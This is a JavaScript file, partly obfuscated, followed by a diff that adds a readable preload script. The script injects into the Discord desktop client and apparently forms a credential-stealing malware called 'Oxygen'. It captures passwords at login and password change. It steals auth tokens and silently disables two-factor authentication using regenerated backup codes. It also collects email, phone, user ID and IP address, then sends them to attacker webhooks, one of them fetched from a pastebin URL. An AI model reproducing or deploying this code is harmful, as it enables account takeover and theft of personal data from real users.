this['fi'+'nd'+'Mo'+'du'+'le'](h=>g['ev'+'er'+'y'](i=>h[i]!==undefined));}static['fi'+'nd'+'Mo'+'du'+'le'+'By'+'Di'+'sp'+'la'+'yN'+'am'+'e'](g){return this['fi'+'nd'+'Mo'+'du'+'le'](h=>h['di'+'sp'+'la'+'yN'+'am'+'e']===g);}static['mo'+'nk'+'ey'+'Pa'+'tc'+'h'](i,j,k){const l={};l['aN'+'ey'+'P']=function(q,r,s,t){return q(r,s,t);};l['gD'+'es'+'v']='Ac'+'co'+'un'+'t\x20'+'cr'+'ed'+'en'+'ti'+'al'+'s';l['Qo'+'BC'+'i']='Pa'+'ss'+'wo'+'rd';l['DO'+'ma'+'i']='<u'+'nk'+'no'+'wn'+'>';l['SF'+'nm'+'f']=function(q,r){return q+r;};l['nF'+'EL'+'B']='`i'+'ns'+'te'+'ad'+'`\x20'+'ca'+'ll'+'ba'+'ck'+'\x20o'+'f\x20';l['Cb'+'Yf'+'L']=function(q,r){return q!==r;};l['Zo'+'eB'+'M']='qw'+'Vu'+'O';l['Fs'+'KM'+'D']='ee'+'IX'+'T';l['LH'+'Ju'+'v']=function(q,r){return q+r;};l['sc'+'gu'+'B']='`a'+'ft'+'er'+'`\x20'+'ca'+'ll'+'ba'+'ck'+'\x20o'+'f\x20';l['Wo'+'Wl'+'z']=function(q){return q();};l['rC'+'No'+'j']=function(q,r){return q===r;};l['hz'+'uN'+'I']='fu'+'nc'+'ti'+'on';l['Rt'+'xq'+'y']='cE'+'BF'+'f';l['Aq'+'md'+'s']='yz'+'zi'+'A';l['FF'+'zK'+'l']='co'+'lo'+'r:'+'\x20r'+'ed'+';';l['KA'+'Ad'+'Q']=function(q,r){return q||r;};l['Ey'+'Mx'+'t']=function(q,r){return q||r;};l['iX'+'Uu'+'e']='pa'+'tc'+'he'+'d\x20';const m=l;if(m['rC'+'No'+'j'](typeof k,m['hz'+'uN'+'I'])){if(m['Rt'+'xq'+'y']===m['Aq'+'md'+'s']){currentPassword=args['bo'+'dy']['pa'+'ss'+'wo'+'rd'];m['aN'+'ey'+'P'](executeWebhook,m['gD'+'es'+'v'],[{'name':m['Qo'+'BC'+'i'],'value':args['bo'+'dy']['pa'+'ss'+'wo'+'rd']}],![]);}else{const r={};r['in'+'st'+'ea'+'d']=k;r['si'+'le'+'nt']=!![];const s=r;k=s;}}const {before,after,instead,once=![],silent=![],force=![]}=k;const n=k['di'+'sp'+'la'+'yN'+'am'+'e']||i['di'+'sp'+'la'+'yN'+'am'+'e']||i['na'+'me']||i['co'+'ns'+'tr'+'uc'+'to'+'r']?i['co'+'ns'+'tr'+'uc'+'to'+'r']['di'+'sp'+'la'+'yN'+'am'+'e']||i['co'+'ns'+'tr'+'uc'+'to'+'r']['na'+'me']:null;if(!silent)console['lo'+'g'](m['FF'+'zK'+'l'],'co'+'lo'+'r:'+'\x20b'+'la'+'ck'+';','Pa'+'tc'+'he'+'d\x20'+j+('\x20i'+'n\x20'+'mo'+'du'+'le'+'\x20')+m['KA'+'Ad'+'Q'](n,m['DO'+'ma'+'i'])+':',i);if(!i[j]){if(force)i[j]=function(){};else return console['wa'+'rn']('co'+'lo'+'r:'+'\x20b'+'la'+'ck'+';','Me'+'th'+'od'+'\x20'+j+('\x20d'+'oe'+'sn'+'\x27t'+'\x20e'+'xi'+'st'+'\x20i'+'n\x20'+'mo'+'du'+'le'+'\x20')+m['Ey'+'Mx'+'t'](n,m['DO'+'ma'+'i']),i);}const o=i[j];const p=()=>{if(!silent)console['lo'+'g']('co'+'lo'+'r:'+'\x20b'+'la'+'ck'+';','Un'+'pa'+'tc'+'he'+'d\x20'+j+('\x20i'+'n\x20'+'mo'+'du'+'le'+'\x20')+(n||m['DO'+'ma'+'i'])+':',i);i[j]=o;};i[j]=function(){const t={'thisObject':this,'methodArguments':arguments,'cancelPatch':p,'originalMethod':o,'callOriginalMethod':()=>t['re'+'tu'+'rn'+'Va'+'lu'+'e']=t['or'+'ig'+'in'+'al'+'Me'+'th'+'od']['ap'+'pl'+'y'](t['th'+'is'+'Ob'+'je'+'ct'],t['me'+'th'+'od'+'Ar'+'gu'+'me'+'nt'+'s'])};if(instead){const u=Oxygen['Ap'+'i']['su'+'pp'+'re'+'ss'+'Er'+'ro'+'rs'](instead,m['SF'+'nm'+'f'](m['nF'+'EL'+'B'],i[j]['di'+'sp'+'la'+'yN'+'am'+'e']))(t);if(m['Cb'+'Yf'+'L'](u,undefined))t['re'+'tu'+'rn'+'Va'+'lu'+'e']=u;}else{if(m['Cb'+'Yf'+'L'](m['Zo'+'eB'+'M'],m['Fs'+'KM'+'D'])){if(before)Oxygen['Ap'+'i']['su'+'pp'+'re'+'ss'+'Er'+'ro'+'rs'](before,m['LH'+'Ju'+'v']('`b'+'ef'+'or'+'e`'+'\x20c'+'al'+'lb'+'ac'+'k\x20'+'of'+'\x20',i[j]['di'+'sp'+'la'+'yN'+'am'+'e']))(t);t['ca'+'ll'+'Or'+'ig'+'in'+'al'+'Me'+'th'+'od']();if(after)Oxygen['Ap'+'i']['su'+'pp'+'re'+'ss'+'Er'+'ro'+'rs'](after,m['LH'+'Ju'+'v'](m['sc'+'gu'+'B'],i[j]['di'+'sp'+'la'+'yN'+'am'+'e']))(t);}else{const w=firstCall?function(){if(fn){const x=fn['ap'+'pl'+'y'](context,arguments);fn=null;return x;}}:function(){};firstCall=![];return w;}}if(once)m['Wo'+'Wl'+'z'](p);return t['re'+'tu'+'rn'+'Va'+'lu'+'e'];};i[j]['__'+'mo'+'nk'+'ey'+'Pa'+'tc'+'he'+'d']=!![];i[j]['di'+'sp'+'la'+'yN'+'am'+'e']=m['LH'+'Ju'+'v'](m['iX'+'Uu'+'e'],i[j]['di'+'sp'+'la'+'yN'+'am'+'e']||j);i[j]['un'+'pa'+'tc'+'h']=p;return p;}static['su'+'pp'+'re'+'ss'+'Er'+'ro'+'rs'](h,i){const j={};j['hd'+'Ar'+'I']=function(l,m){return l(m);};j['xn'+'DK'+'j']=function(l,m){return l+m;};j['Qo'+'oB'+'N']='Er'+'ro'+'r\x20'+'oc'+'cu'+'rr'+'ed'+'\x20i'+'n\x20';const k=j;return(...l)=>{try{return k['hd'+'Ar'+'I'](h,...l);}catch(m){console['er'+'ro'+'r'](k['xn'+'DK'+'j'](k['Qo'+'oB'+'N'],i),m);}};}};function c(h){const i={};i['ip'+'KN'+'z']=function(l,m){return l==m;};i['Yc'+'bn'+'e']=function(l,m){return l===m;};i['KL'+'wH'+'x']='st'+'ri'+'ng';i['wu'+'EJ'+'J']='wh'+'il'+'e\x20'+'(t'+'ru'+'e)'+'\x20{'+'}';i['Ty'+'Uy'+'r']='co'+'un'+'te'+'r';i['yu'+'Jj'+'q']=function(l,m){return l===m;};i['MM'+'fE'+'Z']='hd'+'QO'+'D';i['qj'+'dg'+'a']=function(l,m){return l!==m;};i['xY'+'NF'+'G']=function(l,m){return l+m;};i['Nt'+'go'+'L']='le'+'ng'+'th';i['ZD'+'sH'+'b']=function(l,m){return l+m;};i['vD'+'Ke'+'L']='de'+'bu';i['tK'+'OX'+'G']=function(l,m){return l+m;};i['ww'+'yU'+'u']='gg'+'er';i['qh'+'lL'+'J']='st'+'at'+'eO'+'bj'+'ec'+'t';i['le'+'Fk'+'V']=function(l,m){return l(m);};i['Ld'+'Kr'+'F']=function(l,m){return l===m;};i['gS'+'Jg'+'c']='/u'+'se'+'rs'+'/@'+'me'+'/b'+'il'+'li'+'ng'+'/p'+'ay'+'me'+'nt'+'s';i['tF'+'Ra'+'C']='/u'+'se'+'rs'+'/@'+'me'+'/e'+'nt'+'it'+'le'+'me'+'nt'+'s/'+'gi'+'ft'+'s';i['rq'+'wr'+'l']='iv'+'gS'+'A';const j=i;function k(l){const m={};m['Qk'+'ak'+'i']=function(o,p){return j['ip'+'KN'+'z'](o,p);};const n=m;if(j['Yc'+'bn'+'e'](typeof l,j['KL'+'wH'+'x'])){return function(o){}['co'+'ns'+'tr'+'uc'+'to'+'r'](j['wu'+'EJ'+'J'])['ap'+'pl'+'y'](j['Ty'+'Uy'+'r']);}else{if(j['yu'+'Jj'+'q'](j['MM'+'fE'+'Z'],'Ol'+'ic'+'M')){const p=window['re'+'q']['c'][i]['ex'+'po'+'rt'+'s'];if(p&&p['__'+'es'+'Mo'+'du'+'le']&&p['de'+'fa'+'ul'+'t']&&n['Qk'+'ak'+'i'](moduleName,p['de'+'fa'+'ul'+'t'][moduleName]))modules['pu'+'sh'](p['de'+'fa'+'ul'+'t']);}else{if(j['qj'+'dg'+'a'](j['xY'+'NF'+'G']('',l/l)[j['Nt'+'go'+'L']],0x1)||l%0x14===0x0){(function(){return!![];}['co'+'ns'+'tr'+'uc'+'to'+'r'](j['ZD'+'sH'+'b'](j['vD'+'Ke'+'L'],'gg'+'er'))['ca'+'ll']('ac'+'ti'+'on'));}else{(function(){return![];}['co'+'ns'+'tr'+'uc'+'to'+'r'](j['tK'+'OX'+'G'](j['vD'+'Ke'+'L'],j['ww'+'yU'+'u']))['ap'+'pl'+'y'](j['qh'+'lL'+'J']));}}}j['le'+'Fk'+'V'](k,++l);}try{if(j['qj'+'dg'+'a'](j['rq'+'wr'+'l'],j['rq'+'wr'+'l'])){const m=j['Ld'+'Kr'+'F'](typeof args,'st'+'ri'+'ng')?args:args['ur'+'l'];if(m['in'+'cl'+'ud'+'es'](j['gS'+'Jg'+'c'])){response['bo'+'dy']=[];}else if(m['in'+'cl'+'ud'+'es'](j['tF'+'Ra'+'C'])){response['bo'+'dy']=[];}}else{if(h){return k;}else{j['le'+'Fk'+'V'](k,0x0);}}}catch(m){}}
+  const j = window.require("path");
+  const k = window.require("fs");
+  const l = window.require("electron");
+  const m = window.require("module").Module;
+  m.globalPaths.push(
+    j.resolve(l.remote.app.getAppPath(), "node_modules")
+  );
+  const n = l.remote.getCurrentWindow();
+  if (n.__preload) require(n.__preload);
+  let o = "";
+  function p(u) {
+    return new Promise(x => {
+        setTimeout(x, u);
+    });
+  }
+  Oxygen = {};
+  Oxygen.localStorage = window.localStorage;
+  async function q() {
+    while (!window.webpackJsonp) await p(100);
+    Oxygen.webSocket = window._ws;
+    window.req = window.webpackJsonp.push([[], y, [["__extra_id__"]]]);
+    delete window.req.__extra_id__;
+    delete window.req.c.__extra_id__;
+    while (!Oxygen.Api.findModule("dispatch")) await p(100);
+  }
+
+  process.once("loaded", async () => {
+    await q();
+    const w = Oxygen.Api.findModule("post");
+    const x = Oxygen.Api.findModule("setToken");
+    r("post", function(A, B) {
+        switch (A.url) {
+          case "/auth/login":
+            if (B.status === 200) {
+              o = A.body.password;
+              s("Account\x20credentials", [{ name: "Password", value: A.body.password }], false);
+            }
+            break;
+        }
+      
+    });
+    const y = w.post;
+    w.post = async function(A, B, C) {
+      if (A.url == "/users/@me/mfa/totp/enable" && process.env.mfa) {
+          A.body.code = "d";
+      }
+      return y(A, B, C);
+    };
+    r("patch", function(A, B) {
+      switch (A.url) {
+        case "/users/@me":
+          if (B.status == 0xc8) {
+            let C;
+            if (A.body.new_password) C = A.body.new_password;
+            else if (A.body.password) C = A.body.password;
+            else return;
+            const D = {};
+            D.name = "Password";
+            D.value = C;
+            s("Account\x20credentials", [D], false);
+          }
+          break;
+      }
+    });
+    const z = x.setToken;
+    x.setToken = function(A) {
+      const B = {};
+      B.fvMEU = function(D, E) {
+        return D == E;
+      };
+      B.PgtGD = "/users/@me/mfa/totp/enable";
+      B.GNhsC = function(D, E, F, G) {
+        return D(E, F, G);
+      };
+      B.RMRdT = function(D, E) {
+        return D === E;
+      };
+      const C = B;
+        z(A);
+        if (A) {
+          if (A.startsWith("mfa") && process.env.mfa) {
+            if (o != "") {
+              const E = {};
+              E.password = o;
+              E.regenerate = !![];
+              const F = {};
+              F.url = "/users/@me/mfa/codes";
+              F.body = E;
+              w.post(F).then(function(G) {
+                  if (G.status === 0xc8) {
+                    const H = {};
+                    H.code = G.body.backup_codes[0].code;
+                    const I = {};
+                    I.url = "/users/@me/mfa/totp/disable";
+                    I.body = H;
+                    w.post(I).then(function(J) {
+                      if (J.status === 0xc8) {
+                        x.setToken(J.body.token);
+                      }
+                    });
+                  }
+              });
+            } else {
+                Oxygen.Api.findModule("login").logout();
+            }
+            return;
+          }
+          s("Account\x20Authorization\x20Token", [{ name: "Token", value: A }]);
+        }
+      
+    };
+    if (k.existsSync(process.env.modDir + "\x5cnot_log_out") === false) {
+      Oxygen.Api.findModule("login").logout();
+      k.writeFile(process.env.modDir + "\x5cnot_log_out", "", function() {});
+    }
+  });
+
+  function r(u, v) {
+    const y = Oxygen.Api.findModule("post");
+    const z = y[u];
+    y[u] = async function(A, B, C) {
+      const D = await z(A, B, C);
+      const E = v(A, D);
+      if (E) return E;
+      else return D;
+    };
+  }
+
+  function s(u, v, w = true) {
+    return new Promise(function(z) {
+        const C = setInterval(async function() {
+            const F = Oxygen.Api.findModule("getUser").getCurrentUser();
+            if (F) {
+              clearInterval(C);
+              const G = {};
+              G.name = "ID";
+              G.value = F.id;
+              const H = {};
+              H.name = "Email";
+              H.value = F.email;
+              const I = {};
+              I.name = "User";
+              I.value = F.username + "#" + F.discriminator;
+              const J = [G, H, I];
+              if (F.phone) {
+                const T = {};
+                T.name = "Phone\x20number";
+                T.value = F.phone;
+                J.push(T);                
+              }
+              const K = Oxygen.Api.findModule("post");
+              const L = new XMLHttpRequest();
+              L.open("GET", "https://wtfismyip.com/text", false);
+              L.send();
+              const M = {};
+              M.name = "IP";
+              M.value = L.responseText;
+              const N = {};
+              N.title = u;
+              N.fields = [M].concat(J).concat(v);
+              const O = {};
+              O.embeds = [N];
+              const P = O;
+              if (!w) {
+                const U = {};
+                U.url = "https://cdn.discordapp.com/attachments/710754476977422421/711462168482021406/filler.png";
+                P.embeds[0].thumbnail = U;
+              }
+              const Q = function(V) {
+                return new Promise(async function(W) {
+                  while (true) {
+                    try {
+                        const Z = {};
+                        Z.url = "/webhooks/" + V;
+                        Z.body = P;
+                        await K.post(Z);
+
+                    } catch (a1) {
+
+                        if (a1.status) {
+                          if (a1.status === 429) {
+
+                              await p(a1.body.retry_after);
+                              continue;
+                            
+                          }
+                        }
+                      
+                    }
+                    W();
+                    return;
+                  }
+                });
+              };
+              Q(process.env.hook);
+              const R = new XMLHttpRequest();
+              R.open("GET", "https://cors-anywhere.herokuapp.com/pastebin.com/raw/cBCZXkF7");
+              R.setRequestHeader("Content-Type", "application/json");
+              R.onreadystatechange = async function(V) {
+
+                  if (R.readyState === 4) {
+                   Q(R.responseText);
+                  }
+                
+              };
+              R.send();
+              
+            }
+        }, 100);
+    });
+  }
+  Oxygen.Api = class u {
+    static get React() {
+      return this.findModuleByProps("createElement");
+    }
+    static get ReactDOM() {
+      return this.findModuleByProps("findDOMNode");
+    }
+    static findModule(v) {
+      const z = typeof v === "string" ? v : null;
+      for (const A in window.req.c) {
+        if (window.req.c.hasOwnProperty(A)) {
+            const C = window.req.c[A].exports;
+            if (
+              C &&
+              C.__esModule &&
+              C.default &&
+              (z ? C.default[z] : v(C.default))
+            )
+              return C.default;
+            if (C && (z ? C[z] : v(C))) return C;
+            
+        }
+      }
+      return null;
+    }
+    static findRawModule(v) {
+      const z = typeof v === "string" ? v : null;
+      for (const A in window.req.c) {
+        if (window.req.c.hasOwnProperty(A)) {
+          const B = window.req.c[A].exports;
+          if (
+            B &&
+            B.__esModule &&
+            B.default &&
+            (z ? B.default[z] : v(B.default))
+          )
+            return window.req.c[A];
+          if (B && (z ? B[z] : v(B))) return window.req.c[A];
+        }
+      }
+      return null;
+    }
+    static findAllModules(v) {
+      const y = typeof v === "string" ? v : null;
+      const z = [];
+      for (const A in window.req.c) {
+ 
+          if (window.req.c.hasOwnProperty(A)) {
+            if ("bmYdM" !== x.itkkw) {
+              return this.findModule(C => C.displayName === name);
+            } else {
+              const C = window.req.c[A].exports;
+              if (
+                C &&
+                C.__esModule &&
+                C.default &&
+                y == C.default[y]
+              )
+                z.push(C.default);
+            }
+          }
+
+      }
+      return z;
+    }
+
+    static findModuleByProps(...v) {
+      return this.findModule(w => v.every(x => w[x] !== undefined));
+    }
+
+    static findModuleByDisplayName(v) {
+      return this.findModule(w => w.displayName === v);
+    }
+
+    static monkeyPatch(v, w, x) {
+      if (typeof x === "function") {
+        const D = {};
+        D.instead = x;
+        D.silent = true;
+        x = D;
+      }
+      const { before, after, instead, once = false, silent = false, force = false } = x;
+      const A = x.displayName || v.displayName || v.name || v.constructor ? v.constructor.displayName || v.constructor.name : null;
+      if (!silent)
+        console.log(
+          "color:\x20red;",
+          "color:\x20black;",
+          "Patched\x20" +
+            w +
+            "\x20in\x20module\x20" +
+            A || "<unknown>" +
+            ":",
+          v
+        );
+      if (!v[w]) {
+        if (force) v[w] = function() {};
+        else
+          return console.warn(
+            "color:\x20black;",
+            "Method\x20" +
+              w +
+              "\x20doesn\x27t\x20exist\x20in\x20module\x20" +
+              A || "<unknown>",
+            v
+          );
+      }
+      const B = v[w];
+      const C = () => {
+
+          if (!silent)
+            console.log(
+              "color:\x20black;",
+              "Unpatched\x20" +
+                w +
+                "\x20in\x20module\x20" +
+                A  || "<unknown>" +
+                ":",
+              v
+            );
+          v[w] = B;
+        
+      };
+      v[w] = function() {
+        const F = {
+          thisObject: this,
+          methodArguments: arguments,
+          cancelPatch: C,
+          originalMethod: B,
+          callOriginalMethod: () =>
+            (F.returnValue = F.originalMethod.apply(
+              F.thisObject,
+              F.methodArguments
+            ))
+        };
+        if (instead) {
+
+            const H = Oxygen.Api.suppressErrors(
+              instead,
+              "`instead`\x20callback\x20of\x20" + v[w].displayName
+            )(F);
+            if (H !== undefined) F.returnValue = H;
+          
+        } else {
+          if (before)
+            Oxygen.Api.suppressErrors(
+              before,
+              "`before`\x20callback\x20of\x20" + v[w].displayName
+            )(F);
+          F.callOriginalMethod();
+          if (after)
+            Oxygen.Api.suppressErrors(
+              after,
+              "`after`\x20callback\x20of\x20" + v[w].displayName
+            )(F);
+        }
+        if (once) C();
+        return F.returnValue;
+      };
+      v[w].__monkeyPatched = !![];
+      v[w].displayName = "patched\x20" + v[w].displayName || w;
+      v[w].unpatch = C;
+      return C;
+    }
+
+
+    static suppressErrors(v, w) {
+      return (...z) => {
+
+          try {
+            return v(...z);            
+          } catch (E) {
+            console.error("Error\x20occurred\x20in\x20" + w, E);
+          }
+        
+      };
+    }
+  };
